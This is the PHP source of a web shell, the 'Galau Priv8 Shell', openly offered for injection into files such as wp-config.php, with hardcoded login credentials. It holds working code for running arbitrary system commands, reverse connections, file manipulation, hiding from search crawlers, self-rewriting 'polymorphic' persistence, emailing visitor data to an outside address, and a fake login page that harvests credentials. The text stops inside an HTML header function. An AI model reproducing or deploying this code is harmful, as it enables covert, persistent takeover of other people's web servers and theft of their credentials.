<?php
/*
Galau Priv8 Shell [Fixed]
Codename: Galau

Features:
[1] File Manager
[2] Reverse Connect
[3] Server Information
[4] Bypass Feature (mini version)
[5] Trap Login Shell + Special Ip Access
[6] Polymorphic

[ Hydra Mode v1.0 by ./MyHeartIsyr ]

Usage: 
Inject the attached code named hydra.php to the configuration file
Ex -> wp-config.php or configuration.php 

Account:
[Username]: MyHeart
[Password]: k4m1_l4p4r

./MyHeartIsyr
*/
@set_time_limit(0);
@error_reporting(0);
@error_log(0);
@session_start();
@define("VERSION", "3.0");

$galau_acc = "1121deb87612ecbef1be4259db7748ba:azRtMV9sNHA0cg==";
$galau_config = array(
	"title" => "Galau Priv8 Shell",
	"version" => VERSION,
	"polymorph" => false,
	"monitor_mode" => false, // as usually :P
	"copyright" => "<center>&copy; Copyleft <a href=\"https://myheart-isyr.blogspot.com\" target=\"_blank\">./MyHeartIsyr</a></center>",
	"debug" => false,
	"logo" => "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"
);
$galau_xyz = explode(":", $galau_acc);
$galau_allowhost = array("*");

if($galau_config['debug'] == true){
	error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
}
else {
	error_reporting(0);
	ini_set('error_log',null);
	ini_set('html_errors',0);
	ini_set('log_errors',0);
	ini_set('log_errors_max_len',0);
	ini_set('display_errors',0);
	ini_set('display_startup_errors',0);
}

$galau_menu = array();
$galau_menu['mylink'][] = array("name" => "Home", "url" => "?");
$galau_menu['mylink'][] = array("name" => "Console", "url" => "?poxis=console");
$galau_menu['mylink'][] = array("name" => "About Me", "url" => "?poxis=about");
$galau_menu['mylink'][] = array("name" => "Server Info", "url" => "?poxis=info");
$galau_menu['mylink'][] = array("name" => "Reverse Connect", "url" => "?poxis=bcme");
$galau_menu['mylink'][] = array("name" => "Php Info", "url" => "?poxis=phpinfo");
$galau_menu['mylink'][] = array("name" => "Logout", "url" => "?poxis=keluar");

if(!empty($_SERVER['HTTP_USER_AGENT'])){
	$galau_useragent = array("Googlebot", "MSNBot", "facebookexternalhit", "PycURL", "bingbot", "ia_archiver", "Yandex", "Rambler", "Yahoo! Slurp");
	if(preg_match("/".implode("|", $galau_useragent)."/i", $_SERVER['HTTP_USER_AGENT'])){
		@header("HTTP/1.1 404 Not Found");
		exit;
	}
}

if(@get_magic_quotes_gpc()){
	foreach($_POST as $x => $o){
		$_POST[$x] = stripslashes($o);
	}
	foreach($_SESSION as $z => $b){
		$_SESSION[$z] = stripslashes($b);
	}
}

// -- For Polymorphic (biar lebih lama di server :P)

function galau_polymorph(){
	$galau_file = $_SERVER['SCRIPT_FILENAME'];
	$galau_morphic = "galau_";
	$galau_sess = $_SERVER['REQUEST_TIME'];

	$galau_temp = file_get_contents($galau_file);
	$galau_temc = str_replace("galau_file", "galau_file", $galau_temp);
	$galau_temp = str_replace($galau_morphic, "hax0rz".$galau_sess."_", $galau_temc);
	$galau_temp = str_replace("galau_file", "galau_file", $galau_temp);

	$fp = @fopen($galau_file, "w");
	fwrite($fp, $galau_temp);
	fclose($fp);
}

// -- Untuk eksekusi

if($galau_config['polymorph'] == true){
	galau_polymorph();
}

// -- Logging

if($galau_config['monitor_mode'] == true){
	$galau_dari = "myheart-isyr@linuxmail.org";
	$galau_ip = $_SERVER['REMOTE_ADDR'];
	if(preg_match("/Windows/", $_SERVER['HTTP_USER_AGENT'])){
		$galau_os = "Windows";
	}
	elseif(preg_match("/Linux/", $_SERVER['HTTP_USER_AGENT'])){
		$galau_os = "Linux";
	}
	elseif(preg_match("/Macintosh/", $_SERVER['HTTP_USER_AGENT'])){
		$galau_os = "Macintosh";
	}
	elseif(preg_match("/Android/", $_SERVER['HTTP_USER_AGENT'])){
		$galau_os = "Android";
	}
	elseif(preg_match("/".implode("|", $galau_useragent)."/i", $_SERVER['HTTP_USER_AGENT'])){
		$galau_os = "Robots";
	}
	else {
		$galau_os = "Another Os";
	}
	if(preg_match("/Firefox/", $_SERVER['HTTP_USER_AGENT'])){
		$galau_browser = "Mozilla Firefox";
	}
	elseif(preg_match("/Chrome/", $_SERVER['HTTP_USER_AGENT'])){
		$galau_browser = "Google Chrome";
	}
	elseif(preg_match("/Safari/", $_SERVER['HTTP_USER_AGENT'])){
		$galau_browser = "Safari";
	}
	elseif(preg_match("/(MSIE|Trident)/", $_SERVER['HTTP_USER_AGENT'])){
		$galau_browser = "Internet Explorer";
	}
	elseif(preg_match("/Opera/", $_SERVER['HTTP_USER_AGENT'])){
		$galau_browser = "Opera Browser";
	}
	elseif(preg_match("/Havij/", $_SERVER['HTTP_USER_AGENT'])){
		$galau_browser = "Havij Tool";
	}
	else {
		$galau_browser = "Another Browser";
	}


	$galau_subject = "Logs Report";
	$galau_msg = "Ip: " . $galau_ip . "\r\n";
	$galau_msg .= "Browser: " . $galau_browser . "\r\n";
	$galau_msg .= "Operating System: " . $galau_os . "\r\n";
	$galau_msg .= "Last Access" . date("F j Y, g:i A") . "\r\n";


	$galau_myheader = "Content-Type: text/html; charset=iso-8859-1" . "\r\n";
	$galau_myheader .= "MIME-Version: 1.0" . "\r\n";
	$galau_myheader .= "From: Lovely Admin <".$_SERVER['SERVER_ADMIN'].">" . "\r\n";
	$galau_myheader .= "To: $galau_dari" . "\r\n";
	

	@mail($galau_dari, $galau_subject, $galau_msg, $galau_myheader);
}

// -- File Manager

function galau_chmodfile($file, $mode){
	if(@chmod($file, $mode)){
		echo "<script>alert('Done');</script>";
		echo "<meta http-equiv=\"refresh\" content=\"0; url=".$_SERVER['PHP_SELF']."\">";
	}
	else {
		echo "<script>alert('Permission Denied');</script>";
		echo "<meta http-equiv=\"refresh\" content=\"0; url=".$_SERVER['PHP_SELF']."\">";
	}
}

function galau_del($file){
	if(@unlink($file)){
		echo "<script>alert('Done');</script>";
		echo "<meta http-equiv=\"refresh\" content=\"0; url=?meong=".$_GET['meong']."\">";
	}
	else {
		echo "<script>alert('Permission Denied');</script>";
		echo "<meta http-equiv=\"refresh\" content=\"0; url=?meong=".$_GET['meong']."\">";
	}
}

function galau_newfile($filenyo){
	$dx = @fopen(htmlspecialchars($filenyo), "a");
	if($dx){
		echo "<script>alert('Done');</script>";
		echo "<meta http-equiv=\"refresh\" content=\"0; url=".$filenyo."\">";
	}
	else {
		echo "<script>alert('Permission Denied');</script>";
		echo "<meta http-equiv=\"refresh\" content=\"0; url=".$_SERVER['PHP_SELF']."\">";
	}
}

function galau_newfolder($foldernyo, $dirz){
	if(@mkdir($dirz ."/". $foldernyo)){
		echo "<script>alert('Done');</script>";
		echo "<meta http-equiv=\"refresh\" content=\"0; url=".$dirz ."/". $foldernyo."\">";
	}
	else {
		echo "<script>alert('Permission Denied');</script>";
		echo "<meta http-equiv=\"refresh\" content=\"0; url=".$_SERVER['PHP_SELF']."\">";
	}
}

function galau_rm($dirz){
	if(@rmdir($dirz)){
		echo "<script>alert('Done');</script>";
		echo "<meta http-equiv=\"refresh\" content=\"0; url=?meong=".dirname($_GET['meong'])."\">";
	}
	else {
		echo "<script>alert('Permission Denied');</script>";
		echo "<meta http-equiv=\"refresh\" content=\"0; url=".$_GET['meong']."\">";
	}
}

// -- End

function shexec($x, $win_tick = false){
	if(DIRECTORY_SEPARATOR === "/"){
		$x .= " 2>&1";
	}
	
	if(function_exists("system")){
		ob_start();
		@system($x);
		$out = ob_get_contents();
		ob_end_clean();
		return $out;
	}
	elseif(function_exists("shell_exec")){
		return @shell_exec($x);
	}
	elseif(function_exists("exec")){
		@exec($x, $outArr, $ret);
		return implode(PHP_EOL, $outArr);
	}
	elseif(function_exists("passthru")){
		ob_start();
		@passthru($x, $ret);
		$out = ob_get_contents();
		ob_end_clean();
		return $out;
	}
	elseif(function_exists("proc_open")){
		$deskrip = array(
			0 => array(
				"pipe",
				"r"
			),
			1 => array(
				"pipe",
				"w"
			),
			2 => array(
				"pipe",
				"w"
			)
		);
		if(DIRECTORY_SEPARATOR === "\\"){
			$old_tick = $x;
			if($win_tick){
				$old_tick = "C:\\Windows\\System32\\cmd.exe /C {$x}";
			}
			
			$process = @proc_open($old_tick, $deskrip, $pipes, @getcwd(), null, array(
				"suppress_errors" => false,
				"bypass_shell" => true
			));
			if(!is_resource($process)){
				$old_tick = $x;
				$process = @proc_open($old_tick, $deskrip, $pipes, @getcwd(), null, array(
					"suppress_errors" => false,
					"bypass_shell" => true
				));
			}
		}
		else {
			$process = @proc_open($old_tick, $deskrip, $pipes, @getcwd());
		}
		
		$out = "";
		if(is_resource($process)){
			fclose($pipes[0]);
			$out = stream_get_contents($pipes[1]);
			fclose($pipes[1]);
			$err = stream_get_contents($pipes[2]);
			$out .= $err;
			fclose($pipes[2]);
			$ret = proc_close($process);
		}
		return $out;
	}
	elseif(function_exists("popen")){
		$process = popen($x, "r");
		$out = fread($process, 4096);
		pclose($process);
		return $out;
	}
	return "Every functions is inactive or disabled, sorry dudes :(";
}

function wcek($r, $s){
	if(is_writable($r)){
		return "<font color=lime>$s</font>";
	}
	else {
		return "<font color=red>$s</font>";
	}
}

function rcek($r, $s){
	if(is_readable($r)){
		return "<font color=lime>$s</font>";
	}
	else {
		return "<font color=red>$s</font>";
	}
}

function galau_perms($file) {
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}

function galau_truelogin(){
?>
<html>
<head>
<title>Galau Priv8 Login</title>
<style>
body {
background: #000;
color: #fff;
font-family: Courier New;
}
input {
border: 1px solid #fff;
background: transparent;
color: white;
}
.badan {
height: 100%;
width: 100%;
justify-content: center;
align-items: center;
display: flex;
}
table, tr, td {
border: 1px solid #dd0000;
border-radius: 5px;
}
</style>
</head>
<body>
<div class="badan">
<table width="300" cellpadding="0" cellspacing="1">
<form method="post">
<tr><td>Username</td><td>:</td><td><input type="text" name="username"></td></tr>
<tr><td>Password</td><td>:</td><td><input type="password" name="password"></td></tr>
<tr><td><input type="submit" name="login" value=">>"></td></tr>
</form>
</table>
</div>
</body>
</html>
<?php
exit;
}

function galau_traplogin(){
?>
<!-- Trap Login by ./MyHeartIsyr 

For trapping kiddo who wants this priv8 shell

-->
<html>
<head>
<title>Galau Priv8 Login</title>
<style>
body {
background: #000;
color: #fff;
font-family: Courier New;
}
input {
border: 1px solid #fff;
background: transparent;
color: white;
}
.badan {
height: 100%;
width: 100%;
justify-content: center;
align-items: center;
display: flex;
}
table, tr, td {
border: 1px solid #dd0000;
border-radius: 5px;
}
</style>
</head>
<body>
<div class="badan">
<table width="300" cellpadding="0" cellspacing="1">
<form method="post">
<tr><td>Username</td><td>:</td><td><input type="text" name="user"></td></tr>
<tr><td>Password</td><td>:</td><td><input type="password" name="pass"></td></tr>
<tr><td><input type="submit" name="login" value=">>"></td></tr>
<input type="hidden" name="info" value="<?=$_SERVER['REMOTE_ADDR']?>">
</form>
</table>
</div>
</body>
</html>
<?php
if(isset($_POST['login'])){
	$buka = @fopen("galau_log.txt", "a");
	fwrite($buka, "-=[ Oh, some kiddo has been trapped ]=-" . "\r\n");
	fwrite($buka, "Username: ".$_POST['user']."\r\n");
	fwrite($buka, "Password: ".$_POST['pass']."\r\n");
	fwrite($buka, "Ip Address: ".$_POST['info']."\r\n");
	fwrite($buka, "\n");
	@fclose($buka);
	
	echo "<script>alert('Gagal');</script>";
}
exit;
// -- End
}

$galau_tmp = array();
foreach($galau_allowhost as $galau_ade => $galau_kaka){
	$galau_tmp[] = str_replace("\\*", ".*", preg_quote($galau_kaka));
}
if(!preg_match("!^(".implode("|",$galau_tmp).")$!i", getenv("REMOTE_ADDR")) && !preg_match("!^(".implode("|",$galau_tmp).")$!i", gethostbyaddr($_SERVER['REMOTE_ADDR']))){
	galau_traplogin();
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])){
	if($galau_xyz[0] != md5($_POST['username']) && $galau_xyz[1] != base64_encode($_POST['password'])){
		galau_truelogin();
	}
	else {
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	}
}

function galau_checkany($str){
	if(function_exists($str)){
		return "<font color=\"#00ff00\">ON</font>";
	}
	else {
		return "<font color=\"#dd0000\">OFF</font>";
	}
}

function galau_toolscheck($x){
	if(galau_exe($x)){
		return "<font color=\"#00ff00\">ON</font>";
	}
	else {
		return "<font color=\"#dd0000\">OFF</font>";
	}
}

if(isset($_GET['meong'])){
	$galau_vx = $_GET['meong'];
	@chdir($galau_vx);
}
else {
	$galau_vx = @getcwd();
}

$galau_vx = str_replace("\\", "/", $galau_vx);

$titel = sprintf("%s - %s", $galau_config['title'], $galau_config['version']);
$logoku = $galau_config['logo'];

function galau_header(){
	global $titel, $logoku, $galau_vx, $galau_menu;
	
	echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">
	<html><head><title>".$titel."</title>
	<meta http-equiv=\"content-type\" charset=\"utf-8\">
	<meta name=\"robots\" content=\"noindex, nofollow\">
	<link rel=\"shortcut icon\" href=\"data:image/png;base64,".$logoku."\" type=\"image/x-icon\">
	<style>
	body { background: #000000; color: #ffffff; font-family: Agency FB; }
	::-moz-selection{ background: green; color: white; }
	::selection{ background: green; color: white; }
	a { color: #dd0000; text-decoration: none; }
	a:hover { text-decoration: underline; }
	.gayadeh { font-weight: bold; }
	#filez { background: #333333; border-bottom: 5px solid #444; border-top: 5px solid #444; border-right: 5px solid #444; border-left: 5px solid #444; }
	#filez table, tr, td { border: 1px solid #000; }
